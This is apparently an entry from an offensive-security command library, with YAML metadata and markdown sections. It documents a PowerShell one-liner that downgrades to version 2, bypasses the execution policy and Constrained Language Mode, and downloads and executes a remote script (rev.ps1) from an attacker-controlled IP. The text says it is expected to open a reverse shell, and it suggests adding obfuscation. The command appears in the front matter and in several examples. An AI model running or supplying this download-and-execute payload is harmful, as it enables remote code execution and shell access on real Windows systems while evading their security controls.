---
type: command
executor: powershell
data: >-
  powershell.exe -version 2 -ep bypass -command "IEX (New-Object
  Net.WebClient).DownloadString('http://$_ATTACKER_IP/rev.ps1')"
output: null
platforms:
  - Windows
tags:
  - bypass
  - download
verified: true
validated: true
---

# powershell-v2-download-execute-script

## Command

```powershell
powershell.exe -version 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://$_ATTACKER_IP/rev.ps1')"
```

## Description

This command invokes PowerShell version 2 with bypassed execution policy to download and execute a remote script, bypassing CLM since v2 lacks support for it.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address hosting the script (e.g., rev.ps1) | Yes |
| -version 2 | Use PowerShell v2 engine | Yes |
| -ep bypass | Bypass execution policy | Yes |
| -command | Inline command to execute | Yes |

## Examples

### Basic Usage

```powershell
powershell.exe -version 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/rev.ps1')"
```

### Advanced Usage

Combine with obfuscation or proxies if needed.

## Expected Output

The downloaded script executes; if rev.ps1 is a reverse shell, expect a connection back to the listener without CLM errors.

## Related

- [[procedures/Bypass-Constrained-Language-Mode-with-PowerShell-DLL-Runner]]
- [[tools/PowerShdll]]
